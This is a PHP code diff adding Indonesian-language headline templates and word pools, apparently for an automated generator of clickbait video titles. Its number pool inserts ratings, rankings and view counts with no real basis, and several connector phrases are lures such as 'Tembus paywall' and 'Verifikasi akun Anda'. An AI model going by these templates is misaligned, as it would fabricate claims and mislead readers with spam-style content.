+    '{$BRANDS} {$E} Pinnacle {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$CTA} {$PLATFORM}',
+    '{$E} Paradigm {$TONE}: {$W} {$SUBJECT} {$ADJ} {$PROF} — {$BRANDS} {$SOCIAL} {$TAG}',
+    '{$BRANDS} {$E} Summit {$EMOSI}: {$W} {$SUBJECT} di {$PLACE} {$ANGKA} {$AUDIENCE} {$URGENCY}',
+    '{$E} Crown {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$WAKTU} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Thunder: {$W} {$SUBJECT} {$EMOSI} di {$PLACE} {$SOCIAL} {$ANGKA}',
+    '{$E} Glacier {$TONE}: {$W} {$SUBJECT} {$ADJ} {$PROF} — {$BRANDS} {$PLATFORM} {$URGENCY}',
+    '{$BRANDS} {$E} Eclipse {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$TAG} {$CTA}',
+    '{$E} Tempest {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Comet {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$WAKTU} {$PLATFORM}',
+    '{$TAG} {$E} Meteor {$TONE}: {$W} {$SUBJECT} {$PROF} — {$BRANDS} {$CTA} {$URGENCY}',
+    '{$BRANDS} {$E} Polaris {$ADJ}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$ANGKA} {$AUDIENCE}',
+    '{$E} Helix {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$WAKTU} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Titan {$TONE}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} {$TAG} {$CTA} {$ANGKA}',
+    '{$E} Olympus {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$EMOSI} — {$BRANDS} {$PLATFORM} {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Bastion {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$ANGKA} {$URGENCY} {$CTA}',
+    '{$E} Citadel {$EMOSI}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$WAKTU} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Gauntlet {$TONE}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$SOCIAL} {$TAG}',
+    '{$E} Colosseum {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$ANGKA} di {$PLACE} — {$BRANDS} {$CTA}',
+);
+
+$p['titles_instruksi'] = array(
+    '{$BRANDS} {$E} {$TAG} {$HOOK} {$W} Video {$SUBJECT} {$ACTION} di {$PLACE} — {$CTA}',
+    '{$TAG} {$HOOK} {$W} {$E} {$BRANDS} — {$SUBJECT} {$PROF} Live {$SOCIAL} {$URGENCY}',
+    '{$BRANDS} {$E} {$CTA}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$TAG} {$PLATFORM}',
+    '{$E} {$HOOK} {$W} Aksi {$TONE} {$SUBJECT} {$PROF} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} {$TAG} Streaming: {$W} {$SUBJECT} {$ADJ} di {$PLACE} — {$CTA}',
+    '{$BRANDS} — {$E} {$HOOK} {$W} {$SUBJECT} {$PROF} di {$PLACE} {$SOCIAL} {$URGENCY}',
+    '{$E} Watch {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} | {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} Full Video {$ADJ} {$W} {$SUBJECT} {$PROF} {$ACTION} {$CTA}',
+    '{$TAG} {$HOOK} {$W} {$E} Konten {$SUBJECT} di {$PLACE} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Live Stream {$EMOSI} {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$ANGKA}',
+    '{$E} {$BRANDS} Play {$WAKTU}: {$W} Video {$EMOSI} {$SUBJECT} {$PROF} {$ANGKA} {$PLATFORM}',
+    '{$BRANDS} {$E} {$CTA}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$URGENCY}',
+    '{$TAG} {$HOOK} {$W} {$E} {$BRANDS} Video {$SUBJECT} {$TONE} {$SOCIAL}',
+    '{$BRANDS} {$E} Episode {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$WAKTU} {$ANGKA}',
+    '{$E} {$BRANDS} Stream {$EMOSI} {$WAKTU}: {$W} Aksi {$SUBJECT} di {$PLACE} {$ANGKA}',
+    '{$BRANDS} {$E} Video {$ADJ} {$W} {$SUBJECT} yang {$ACTION} {$SOCIAL} {$URGENCY}',
+    '{$BRANDS} {$E} {$TAG} On Demand: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$CTA}',
+    '{$E} {$HOOK} {$W} Film {$TONE} {$SUBJECT} {$ACTION} — {$BRANDS} {$PLATFORM}',
+    '{$BRANDS} {$E} Playlist {$EMOSI} {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$AUDIENCE}',
+    '{$BRANDS} {$E} Channel {$EMOSI}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$WAKTU}',
+    '{$E} {$BRANDS} Premiere {$ADJ}: {$W} {$SUBJECT} {$PROF} {$TAG} {$SOCIAL}',
+    '{$TAG} {$HOOK} {$W} {$E} {$BRANDS} — Saksikan {$SUBJECT} di {$PLACE} {$URGENCY}',
+    '{$BRANDS} {$E} Watch Party {$TONE}: {$W} {$SUBJECT} {$ACTION} {$CTA} {$PLATFORM}',
+    '{$E} Series {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} {$TAG} Clip Viral: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$CTA}',
+    '{$BRANDS} {$E} Reel {$EMOSI} {$WAKTU}: {$W} Aksi {$SUBJECT} {$PROF} {$ANGKA} {$TAG}',
+    '{$TAG} {$HOOK} {$W} {$E} Footage {$EMOSI} {$SUBJECT} di {$PLACE} {$WAKTU} {$ANGKA}',
+    '{$E} {$BRANDS} Exclusive {$TONE}: {$W} Video {$SUBJECT} {$PROF} {$CTA} {$SOCIAL}',
+    '{$BRANDS} {$E} Dokumenter {$ADJ}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$TAG}',
+    '{$BRANDS} {$E} {$TAG} Behind The Scene: {$W} {$SUBJECT} {$PROF} {$PLATFORM} {$CTA}',
+    '{$E} Trailer {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} | {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Sneak Peek {$ADJ}: {$W} {$SUBJECT} {$PROF} {$TAG} {$SOCIAL}',
+    '{$BRANDS} {$E} Preview {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$ACTION} {$CTA}',
+    '{$E} {$TAG} {$HOOK} {$W} Rekaman {$ADJ} {$SUBJECT} {$PROF} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Uncut {$TONE}: {$W} {$SUBJECT} {$ACTION} Full {$SOCIAL} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Directors Cut: {$W} {$SUBJECT} di {$PLACE} {$URGENCY}',
+    '{$E} {$BRANDS} Original {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$PLATFORM}',
+    '{$BRANDS} {$E} Mini Series {$TONE}: {$W} {$SUBJECT} {$PROF} {$TAG} {$AUDIENCE}',
+    '{$TAG} {$HOOK} {$W} {$E} {$BRANDS} — Marathon {$ADJ} {$SUBJECT} di {$PLACE} {$CTA}',
+    '{$BRANDS} {$E} Binge Watch {$TONE}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL}',
+    '{$E} Highlight {$ADJ}: {$W} {$SUBJECT} {$PROF} | {$BRANDS} {$TAG} {$URGENCY}',
+    '{$BRANDS} {$E} Best Of {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$CTA} {$PLATFORM}',
+    '{$BRANDS} {$E} {$TAG} Top Clips: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$AUDIENCE}',
+    '{$E} Compilation {$ADJ}: {$W} {$SUBJECT} {$PROF} — {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Recap {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$TAG} {$URGENCY}',
+    '{$BRANDS} {$E} Cut {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$SOCIAL} {$CTA}',
+    '{$TAG} {$HOOK} {$W} {$E} {$BRANDS} — Koleksi {$TONE} {$SUBJECT} {$PLATFORM}',
+    '{$E} {$BRANDS} Vault {$ADJ}: {$W} Video {$SUBJECT} di {$PLACE} {$AUDIENCE} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Archive: {$W} {$SUBJECT} {$PROF} {$TONE} {$SOCIAL} {$URGENCY}',
+    '{$E} {$HOOK} {$W} Mega Clip {$ADJ} {$SUBJECT} {$ACTION} | {$BRANDS} {$CTA} {$TAG}',
+    // batch 2 (51-100)
+    '{$BRANDS} {$E} Ultra Stream {$EMOSI}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$ANGKA} {$TAG}',
+    '{$E} {$HOOK} {$W} Nonton {$EMOSI} {$SUBJECT} {$PROF} {$WAKTU} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} HD Premiere {$WAKTU}: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$ANGKA}',
+    '{$E} Quick Watch {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Flash Video {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$CTA} {$PLATFORM}',
+    '{$TAG} {$HOOK} {$W} {$E} Express Play: {$SUBJECT} di {$PLACE} — {$BRANDS} {$ANGKA}',
+    '{$BRANDS} {$E} Turbo Stream {$ADJ}: {$W} {$SUBJECT} {$PROF} {$WAKTU} {$SOCIAL} {$CTA}',
+    '{$E} Instant Access {$EMOSI}: {$W} Video {$SUBJECT} {$ACTION} | {$BRANDS} {$TAG} {$URGENCY}',
+    '{$BRANDS} {$E} Rapid Play {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$ANGKA} {$AUDIENCE}',
+    '{$TAG} {$E} Speed Watch {$WAKTU}: {$W} {$SUBJECT} {$ADJ} {$PROF} — {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Power Stream {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$PLATFORM} {$SOCIAL}',
+    '{$E} Bolt Play {$ADJ}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} | {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} {$TAG} Nitro Video {$WAKTU}: {$W} {$SUBJECT} {$EMOSI} {$CTA} {$AUDIENCE}',
+    '{$E} Rush Stream {$TONE}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Hyper Watch {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$TAG} {$PLATFORM}',
+    '{$BRANDS} {$E} Blitz Play {$ADJ}: {$W} {$SUBJECT} di {$PLACE} {$CTA} {$URGENCY}',
+    '{$TAG} {$E} Surge Stream: {$W} {$SUBJECT} {$PROF} {$EMOSI} {$WAKTU} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Apex Video {$TONE}: {$W} {$SUBJECT} {$ACTION} {$ANGKA} {$CTA} {$AUDIENCE}',
+    '{$E} Orbit Watch {$EMOSI}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} — {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} {$TAG} Stellar Play {$WAKTU}: {$W} {$SUBJECT} {$PROF} {$SOCIAL} {$PLATFORM}',
+    '{$E} Cosmic Stream {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} | {$BRANDS} {$CTA} {$URGENCY}',
+    '{$BRANDS} {$E} Solar Watch {$EMOSI}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} {$TAG}',
+    '{$TAG} {$E} Lunar Play: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$WAKTU} — {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Galactic Video {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$SOCIAL} {$AUDIENCE}',
+    '{$E} Nova Stream {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$PLATFORM} | {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Plasma Watch {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$TAG} {$CTA}',
+    '{$E} Photon Play {$EMOSI}: {$W} Video {$SUBJECT} di {$PLACE} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Quantum Stream: {$W} {$SUBJECT} {$PROF} {$TONE} {$ANGKA} {$AUDIENCE}',
+    '{$E} Prism Video {$EMOSI}: {$W} {$SUBJECT} {$ADJ} {$ACTION} | {$BRANDS} {$CTA} {$WAKTU}',
+    '{$BRANDS} {$E} Zenith Watch {$WAKTU}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$SOCIAL} {$TAG}',
+    // batch 3 (101-150)
+    '{$BRANDS} {$E} {$TAG} Fusion Stream {$EMOSI}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} {$ANGKA}',
+    '{$E} Matrix Play {$ADJ}: {$W} Video {$SUBJECT} {$PROF} {$WAKTU} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Cipher Video {$TONE}: {$W} {$SUBJECT} {$EMOSI} {$PLATFORM} {$SOCIAL}',
+    '{$TAG} {$E} Pulse Stream {$WAKTU}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} — {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Echo Watch {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$CTA} {$TAG}',
+    '{$E} Delta Play {$ADJ}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} {$TAG} Vertex Stream: {$W} {$SUBJECT} {$EMOSI} {$WAKTU} {$SOCIAL} {$ANGKA}',
+    '{$E} Nexus Video {$TONE}: {$W} {$SUBJECT} {$PROF} — {$BRANDS} {$CTA} {$PLATFORM}',
+    '{$BRANDS} {$E} Signal Play {$EMOSI}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} {$TAG} {$URGENCY}',
+    '{$TAG} {$E} Spectrum Stream {$WAKTU}: {$W} {$SUBJECT} {$ACTION} {$ANGKA} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Horizon Watch {$ADJ}: {$W} Video {$SUBJECT} {$PROF} {$CTA} {$AUDIENCE}',
+    '{$E} Aurora Play {$EMOSI}: {$W} {$SUBJECT} di {$PLACE} {$WAKTU} — {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} {$TAG} Genesis Stream: {$W} {$SUBJECT} {$ADJ} {$ACTION} {$ANGKA} {$SOCIAL}',
+    '{$E} Catalyst Video {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Phoenix Play {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$WAKTU} {$PLATFORM} {$TAG}',
+    '{$TAG} {$E} Infinity Stream: {$W} {$SUBJECT} {$ADJ} {$PROF} {$ANGKA} — {$BRANDS} {$URGENCY}',
+    '{$BRANDS} {$E} Titan Watch {$EMOSI}: {$W} Video {$SUBJECT} di {$PLACE} {$SOCIAL} {$CTA}',
+    '{$E} Olympus Play {$ADJ}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$WAKTU} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} {$TAG} Comet Stream {$TONE}: {$W} {$SUBJECT} {$EMOSI} di {$PLACE} {$ANGKA}',
+    '{$E} Meteor Video {$WAKTU}: {$W} {$SUBJECT} {$ADJ} {$PROF} — {$BRANDS} {$CTA} {$SOCIAL}',
+    '{$BRANDS} {$E} Polaris Watch {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$TAG} {$PLATFORM} {$URGENCY}',
+    '{$TAG} {$E} Helix Play: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Nebula Stream {$ADJ}: {$W} Video {$SUBJECT} {$EMOSI} {$WAKTU} {$CTA}',
+    '{$E} Sentinel Video {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} {$TAG} Pinnacle Play: {$W} {$SUBJECT} {$PROF} {$EMOSI} {$ANGKA} {$URGENCY}',
+    '{$E} Paradigm Stream {$WAKTU}: {$W} {$SUBJECT} {$ADJ} di {$PLACE} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} Summit Watch {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$PLATFORM} {$TAG} {$SOCIAL}',
+    '{$TAG} {$E} Crown Play {$ADJ}: {$W} Video {$SUBJECT} {$PROF} {$ANGKA} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Bastion Stream {$TONE}: {$W} {$SUBJECT} di {$PLACE} {$EMOSI} {$CTA} {$WAKTU}',
+    '{$E} Forge Video {$EMOSI}: {$W} {$SUBJECT} {$ADJ} {$PROF} {$ACTION} | {$BRANDS} {$TAG} {$SOCIAL}',
+    '{$BRANDS} {$E} Citadel Watch {$WAKTU}: {$W} {$SUBJECT} di {$PLACE} {$ANGKA} {$URGENCY} {$CTA}',
+    '{$TAG} {$E} Gauntlet Play: {$W} Video {$SUBJECT} {$PROF} {$EMOSI} — {$BRANDS} {$PLATFORM}',
+    '{$BRANDS} {$E} Eclipse Stream {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$SOCIAL} {$TAG} {$AUDIENCE}',
+    '{$E} Tempest Video {$EMOSI}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$WAKTU} | {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Glacier Play: {$W} {$SUBJECT} {$ADJ} {$ANGKA} {$PLATFORM} {$URGENCY}',
+    '{$E} Thunder Stream {$TONE}: {$W} {$SUBJECT} {$ACTION} di {$PLACE} — {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Obsidian Watch {$EMOSI}: {$W} Video {$SUBJECT} {$PROF} {$CTA} {$TAG} {$WAKTU}',
+    '{$TAG} {$E} Vortex Play {$ADJ}: {$W} {$SUBJECT} di {$PLACE} {$ANGKA} | {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Solstice Stream {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$SOCIAL} {$PLATFORM} {$CTA}',
+    '{$E} Axiom Video {$WAKTU}: {$W} {$SUBJECT} {$ADJ} {$ACTION} di {$PLACE} — {$BRANDS} {$TAG}',
+    '{$BRANDS} {$E} Monolith Watch {$EMOSI}: {$W} {$SUBJECT} {$PROF} {$ANGKA} {$CTA} {$URGENCY}',
+    '{$TAG} {$E} Odyssey Play: {$W} Video {$SUBJECT} di {$PLACE} {$WAKTU} | {$BRANDS} {$SOCIAL}',
+    '{$BRANDS} {$E} Epoch Stream {$ADJ}: {$W} {$SUBJECT} {$ACTION} {$EMOSI} {$AUDIENCE} {$TAG}',
+    '{$E} Cosmos Video {$TONE}: {$W} {$SUBJECT} {$PROF} di {$PLACE} {$ANGKA} — {$BRANDS} {$CTA}',
+    '{$BRANDS} {$E} {$TAG} Supernova Play: {$W} {$SUBJECT} {$ADJ} {$EMOSI} {$WAKTU} {$SOCIAL}',
+    '{$E} Meridian Stream {$EMOSI}: {$W} {$SUBJECT} {$ACTION} {$PLATFORM} | {$BRANDS} {$CTA} {$URGENCY}',
+    '{$BRANDS} {$E} Flashpoint Watch {$WAKTU}: {$W} Video {$SUBJECT} {$PROF} di {$PLACE} {$TAG}',
+    '{$TAG} {$E} Colosseum Play {$ADJ}: {$W} {$SUBJECT} {$EMOSI} {$ANGKA} — {$BRANDS} {$AUDIENCE}',
+    '{$BRANDS} {$E} Parallax Stream {$TONE}: {$W} {$SUBJECT} {$PROF} {$ACTION} {$SOCIAL} {$CTA}',
+    '{$E} Epicenter Video {$EMOSI}: {$W} {$SUBJECT} di {$PLACE} {$WAKTU} {$ANGKA} | {$BRANDS} {$TAG}',
+);
+
+// ─── 3 New Variable Pools (waktu, angka, emosi) — 30 per pool ───────────────
+$p['waktu'] = array(
+    'pagi ini','malam ini','siang tadi','sore ini','dini hari','tengah malam',
+    'akhir pekan','awal bulan','pertengahan tahun','musim liburan','jam makan siang',
+    'subuh buta','jelang magrib','selepas sahur','malam Jumat','Senin pagi',
+    'hari libur','waktu istirahat','jam pulang kerja','saat prime time',
+    'detik ini','baru saja','beberapa jam lalu','kemarin malam','tadi pagi',
+    'pekan ini','bulan April 2026','kuartal kedua','semester ini','sepanjang 2026',
+    // batch 2 (31-50)
+    'Jumat malam','Sabtu sore','Minggu pagi','malam Minggu','tengah pekan',
+    'awal minggu','akhir bulan','pergantian tahun','musim hujan','musim panas',
+    'liburan sekolah','cuti bersama','long weekend','hari raya','malam tahun baru',
+    'jam sibuk','rush hour','golden hour','blue hour','midnight hour',
+);
+$p['angka'] = array(
+    '10+','50+','100+','500+','1000+','ribuan','puluhan ribu','ratusan ribu',
+    'jutaan','#1','Top 3','Top 5','Top 10','Top 20','Top 50',
+    '99%','100%','5 dari 5','4.9 rating','Best of 2026',
+    'ke-7','ke-10','ke-100','nomor satu','peringkat pertama',
+    'dari 1 juta+','menembus 500K','tercatat 10K+','lebih dari 200','total 3000+',
+    // batch 2 (31-50)
+    'Top 100','Top 25','peringkat ke-3','di posisi ke-2','menduduki #1',
+    'lebih dari 50','hampir 1000','mendekati 10.000','tembus 100K','melebihi 1M',
+    'rata-rata 4.8','skor 95/100','grade A+','level 99','tier diamond',
+    'presentase 98%','proporsi 3:1','rasio 10x','faktor 100x','skala mega',
+);
+$p['emosi'] = array(
+    'menggemparkan','bikin merinding','penuh kejutan','mengharukan','mencengangkan',
+    'memukau','mendebarkan','menggetarkan','bikin melongo','tak terduga',
+    'bikin speechless','mengejutkan dunia','memecah rekor','mengguncang','viral seketika',
+    'bikin heboh','sensasional','kontroversial','membakar semangat','menginspirasi jutaan',
+    'bikin ketagihan','sulit dipercaya','di luar nalar','fenomenal','legendaris',
+    'epik','monumental','bersejarah','revolusioner','game-changer',
+    // batch 2 (31-50)
+    'bikin terharu','menghangatkan hati','menyegarkan pikiran','membangkitkan semangat','membakar jiwa',
+    'bikin penasaran','misterius banget','penuh teka-teki','enigmatik','cryptic',
+    'membebaskan','liberating','cathartic','therapeutic','healing',
+    'mind-bending','reality-shifting','paradigm-breaking','norm-defying','boundary-pushing',
+);
+
+// ─── Connector Variable Pools (Kata Penghubung Dinamis) — 45 per pool ──────
+$p['v_lihat'] = array('Saksikan','Tonton langsung','Simak dengan seksama','Nikmati sajian','Jangan lewatkan','Perhatikan baik-baik','Ikuti terus perkembangan','Amati setiap detail','Cermati fenomena','Intip sekarang juga','Pantau perkembangan','Lihat langsung aksi','Explore lebih dalam','Selami dunia','Dalami kisah','Hayati momen','Rasakan sensasi','Teropong peristiwa','Tangkap setiap detik','Selidiki lebih jauh','Pelajari secara mendalam','Kupas tuntas','Sorot tajam','Zoom ke dalam','Fokuskan perhatian','Temukan kebenaran','Bongkar semua fakta','Nikmati setiap adegan','Resapi setiap momen','Cerna setiap informasi','Telaah secara kritis','Bedah setiap aspek','Observasi fenomena','Survei langsung','Analisis mendalam','Dengarkan kisahnya','Pahami konteksnya','Jelajahi setiap sudut','Deteksi setiap nuansa','Lacak perkembangannya','Ikuti alur ceritanya','Baca selengkapnya','Scroll ke bawah','Swipe untuk lihat','Klik untuk detail');
+$p['v_akses'] = array('Akses sekarang','Jelajahi selengkapnya','Telusuri semua','Temukan langsung','Buka portal','Kunjungi halaman','Masuki dunia','Raih kesempatan','Dapatkan akses','Unduh sekarang juga','Manfaatkan fitur','Gunakan platform','Coba langsung','Mulai petualangan','Aktifkan akses','Sambungkan diri','Hubungkan ke sumber','Navigasi ke konten','Login sekarang','Register gratis','Claim akses Anda','Unlock konten','Tap untuk membuka','Klik dan nikmati','Stream langsung','Langganan sekarang','Bookmark halaman ini','Save untuk nanti','Share ke teman','Forward ke grup','Gabung komunitas','Daftar membership','Aktivasi trial','Buka pintu akses','Masuk ke area','Explore katalog','Telusuri arsip','Jelajahi koleksi','Tembus paywall','Raih pass premium','Rebut slot eksklusif','Amankan posisi Anda','Pesan tempat sekarang','Konfirmasi partisipasi','Verifikasi akun Anda');
+$p['v_sajikan'] = array('menyajikan','menghadirkan','mempersembahkan','menyuguhkan','menampilkan','memperlihatkan','memaparkan','mengungkapkan','merilis','menerbitkan','membawakan','meluncurkan','memperkenalkan','menurunkan','mengekspos','menayangkan','mendistribusikan','mengedarkan','menyebarluaskan','mengumumkan','meliput','mendokumentasikan','mencatat','merekam','mengabadikan','menyiarkan','memviralkan','menggaungkan','menggemakan','mempublikasikan','mengunggah','menyalurkan','mentransmisikan','mempromosikan','mengkurasi','memoderasi','menyusun','mengemas','mengolah','mengkompilasi','menghimpun','mengarsipkan','mendigitalisasi','menyinkronkan','memformat');
+$p['p_sebagai'] = array('sebagai','selaku','dalam peran','berprofesi sebagai','berkapasitas sebagai','dalam kapasitas','menjadi','berperan sebagai','bertindak selaku','di posisi','dengan jabatan','mengemban peran','menyandang gelar','berstatus','memikul amanah','dengan predikat','berkedudukan sebagai','atas nama profesi','dalam wujud','berdiri sebagai','tampil sebagai','dikenal sebagai','berpredikat','memegang posisi','menduduki peran','mengisi slot','berlabel','beridentitas','berjuluk','dipercaya sebagai','dikukuhkan sebagai','dinobatkan menjadi','dilantik sebagai','ditunjuk sebagai','ditempatkan sebagai','diangkat menjadi','disahkan sebagai','ditetapkan sebagai','difungsikan sebagai','didapuk sebagai','diplot sebagai','dimandatkan sebagai','diorbitkan sebagai','ditasbihkan sebagai','diposisikan sebagai');
+$p['p_yang'] = array('yang','yang berhasil','yang mampu','yang sukses','yang dikenal','yang terbukti','yang kompeten','yang andal','yang piawai','yang berdedikasi','yang mahir','yang terampil','yang lihai','yang profesional','yang berpengalaman','yang mumpuni','yang cakap','yang gesit','yang tangguh','yang gigih','yang ulet','yang tekun','yang cermat','yang teliti','yang brilian','yang genius','yang visioner','yang inovatif','yang progresif','yang revolusioner','yang fenomenal','yang legendaris','yang monumental','yang spektakuler','yang luar biasa','yang memukau','yang menginspirasi','yang berpengaruh','yang disegani','yang dihormati','yang terpercaya','yang kredibel','yang otoritatif','yang mapan','yang established');
+$p['p_di'] = array('di','di kawasan','di area','di wilayah','di lingkungan','di seputar','di daerah','di regional','di zona','di penjuru','di pelosok','di sekitar','di tengah','di pentas','di ranah','di jantung','di pusat','di koridor','di sudut','di simpul','di titik','di epicentrum','di basis','di markas','di kantong','di jalur','di lintasan','di orbit','di domain','di teritori','di kancah','di panggung','di arena','di medan','di frontier','di benteng','di kubu','di pos','di sektor','di blok','di distrik','di hub','di cluster','di perimeter','di radius');
+$p['p_tentang'] = array('tentang','mengenai','seputar','perihal','berkaitan dengan','terkait','menyangkut','soal','ihwal','yang membahas','mengulas','menyoal','mengupas','menelisik','menelaah','berhubungan dengan','bertopik','bertema','berisikan','membicarakan','menerangkan','menjelaskan','mendiskusikan','menyoroti','menyentuh topik','bersubyek','berpokok','berfokus pada','mengangkat','mendalami','merujuk pada','menyinggung','mengeksplorasi','menginvestigasi','menyelidiki','membedah','menganalisis','mengevaluasi','meninjau','mengkaji','mereview','mempertanyakan','mengkritisi','merespons','menanggapi');
+$p['konek'] = array('Selain itu','Lebih dari itu','Tidak hanya itu','Di samping itu','Bahkan','Terlebih lagi','Menariknya','Yang istimewa','Tak kalah penting','Patut dicatat','Di sisi lain','Perlu diketahui','Hebatnya','Uniknya','Luar biasanya','Yang mengejutkan','Fantastisnya','Spektakulernya','Fenomenalnya','Mencengangkan','Yang tak terduga','Bonus lainnya','Plus point-nya','Nilai tambahnya','Keunggulan lain','Fakta menariknya','Poin pentingnya','Yang spesial','Ekstra istimewanya','Kejutan lainnya','Istimewanya lagi','Lebih jauh lagi','Ditambah lagi','Satu hal lagi','Yang juga penting','Aspek lain yang menarik','Sudut pandang lain','Dimensi baru','Lapisan berikutnya','Tahap selanjutnya','Level berikutnya','Sisi lain yang menarik','Perspektif berbeda','Angle yang unik','Temuan tambahan');
+$p['konek2'] = array('Oleh karena itu','Dengan demikian','Maka dari itu','Sejalan dengan itu','Mengingat hal ini','Sehubungan dengan itu','Atas dasar itu','Karena itulah','Untuk itu','Berkat hal tersebut','Dengan begitu','Sebab itulah','Lantaran itu','Demi kepuasan Anda','Guna itu','Alhasil','Hasilnya','Implikasinya','Konsekuensinya','Efeknya','Dampaknya','Imbasnya','Buahnya','Muaranya','Ujungnya','Kesimpulannya','Intinya','Pada akhirnya','Finalnya','Puncaknya','Singkat kata','Ringkasnya','Konklusinya','Bottom line-nya','Take away-nya','Poin utamanya','Esensinya','Substansinya','Inti saripatinya','Garis besarnya','Secara keseluruhan','Totalitasnya','Secara holistik','Dalam perspektif luas','Bila disimpulkan');
